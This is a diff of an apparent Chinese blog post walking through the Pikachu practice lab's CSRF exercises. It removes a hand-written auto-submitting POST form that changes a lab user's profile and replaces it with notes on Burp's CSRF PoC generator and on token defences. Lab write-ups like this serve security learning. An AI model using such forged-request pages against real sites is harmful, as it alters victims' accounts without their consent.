@@ -124,7 +124,7 @@
 <meta property="og:image" content="https://echozt.github.io/posts/6011/15_7.png">
 <meta property="og:image" content="https://echozt.github.io/posts/6011/15_8.png">
 <meta property="article:published_time" content="2022-04-23T15:14:32.000Z">
-<meta property="article:modified_time" content="2022-05-22T13:42:59.556Z">
+<meta property="article:modified_time" content="2022-09-03T13:59:28.161Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="pikachu">
@@ -306,7 +306,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      10k 字
+      9.3k 字
     </span>
   
 
@@ -473,31 +473,11 @@
 <p>点击修改个人信息，用burp抓包：</p>
 <p> <img src="/posts/6011/3_5.png" srcset="/img/loading.gif" lazyload class></p>
 <p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
-<p>于是在后台加入一个编写的表单信息post.html（本文把此页面放到 的pikachu-master\vul\csrf\csrfpost下）。</p>
-<pre class="line-numbers language-bash"><code class="language-bash">post.html:
-
-<span class="token operator">&lt;</span>html<span class="token operator">></span>
-<span class="token operator">&lt;</span>head<span class="token operator">></span>
-<span class="token operator">&lt;</span>script<span class="token operator">></span> 
-window.onload <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
- document.getElementById<span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span>.click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-<span class="token operator">&lt;</span>/script<span class="token operator">></span>
-<span class="token operator">&lt;</span>/head<span class="token operator">></span>
-<span class="token operator">&lt;</span>body<span class="token operator">></span>
-<span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"post"</span> action<span class="token operator">=</span><span class="token string">"http://192.168.56.1:8099/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"</span><span class="token operator">></span>
-<span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"sex"</span> type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"sex"</span> value<span class="token operator">=</span><span class="token string">"boy"</span> /<span class="token operator">></span>
-<span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"phonenum"</span> type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"phonenum"</span> value<span class="token operator">=</span><span class="token string">"123456789"</span> /<span class="token operator">></span>
- <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"add"</span> type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"add"</span> value<span class="token operator">=</span><span class="token string">"aaa"</span> /<span class="token operator">></span>
-<span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"email"</span> type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"vince@pikachu.com"</span> /<span class="token operator">></span>
-<span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"postsubmit"</span> type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">></span>
-<span class="token operator">&lt;</span>/form<span class="token operator">></span>
-<span class="token operator">&lt;</span>/body<span class="token operator">></span>
-<span class="token operator">&lt;</span>/html<span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这种方法其实对于get和post请求都适用：</p>
+<p>burp抓包之后，通过burp自带的csrf poc，复制url，当点击这个url时，信息就会被修改（这里修改的信息是将性别从boy改成girl）</p>
 <p> <img src="/posts/6011/3_6.png" srcset="/img/loading.gif" lazyload class></p>
-<p>诱导用户点击网址，完成修改</p>
-<p>  <img src="/posts/6011/3_7.png" srcset="/img/loading.gif" lazyload class></p>
+<p>点击那个按钮，信息将会被自动修改，证明存在csrf漏洞：</p>
+<p> <img src="/posts/6011/3_7.png" srcset="/img/loading.gif" lazyload class></p>
 <h2 id="3-3-CSRF-Token"><a href="#3-3-CSRF-Token" class="headerlink" title="3.3 CSRF Token"></a>3.3 CSRF Token</h2><p>同样，在修改信息时抓包，发现加入了token。</p>
 <p>由于token值每次提交后都会失效，恶意攻击者抓到被攻击者的GET请求时里面的token已经失效了，所以网站也就没有执行GET请求的操作，CSRF也就防御成功。</p>
 <p>  <img src="/posts/6011/3_8.png" srcset="/img/loading.gif" lazyload class></p>
